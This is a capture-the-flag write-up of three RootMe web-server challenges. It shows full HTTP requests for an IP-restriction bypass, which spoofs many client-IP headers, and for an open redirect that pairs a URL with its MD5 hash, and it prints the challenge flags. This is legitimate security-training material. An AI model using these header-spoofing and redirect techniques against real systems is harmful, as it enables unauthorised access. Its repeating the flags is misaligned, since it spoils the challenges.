---
title: RootMe WebServer 01-03
date: 2023-11-03 
categories: [RootMe, WebServer]
tags: [RootMe, RootMe - WebServer, WriteUp]
author: barabulkit
---

# 01 - HTML - Source Code

Flag is just in response when we are trying to log in
```html
<!--
Je crois que c'est vraiment trop simple là !
It's really too easy !
password : nZ^&@q5&sjJHev0
-->
```

flag is `nZ^&@q5&sjJHev0`

# 02 - HTTP - IP Restriction bypass

We need to emulate behaviour that we are under private network ip, we can do it by adding headers to request
```http
GET /web-serveur/ch68/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1696866076.1.1.1696866180.0.0.0; _ga=GA1.1.1934363986.1696866077
Upgrade-Insecure-Requests: 1
X-Azure-ClientIP: 192.168.1.1
X-Azure-SocketIP: 192.168.1.1
X-Originating-IP: 192.168.1.1 
X-Forwarded-For: 192.168.1.1 
X-Remote-IP: 192.168.1.1 
X-Remote-Addr: 192.168.1.1
X-Real-Ip: 192.168.1.1 
X-Target-IP: 192.168.1.1 
X-Forwarded-Host: localhost
True-Client-IP: 192.168.1.1 
X-Original-URL: 192.168.1.1 
Front-End-Https: 192.168.1.1 
X-host: 192.168.1.1 
Forwarded: for=192.168.1.1;proto=http;by=192.168.1.1
True-Client-Ip: 192.168.1.1
Forwarded:192.168.1.1
X-Forwarded-Host:192.168.1.1 
Via: 192.168.1.1  
```

and we will get flag `Ip_$po0Fing`

# 03 - HTTP - Open redirect

Service in this challenge takes url and its hash as param, we will get flag if we redirect it on any domain that is not already presented under buttons in this service

```http
GET /web-serveur/ch52/?url=https://vk.com&h=fa4448c13e06e69ba9e814e8743c7e2e HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch52/
Cookie: _ga_SRYSKX09J7=GS1.1.1696866076.1.1.1696866180.0.0.0; _ga=GA1.1.1934363986.1696866077
Upgrade-Insecure-Requests: 1
```

and we will get flag `e6f8a530811d5a479812d7b82fc1a5c5`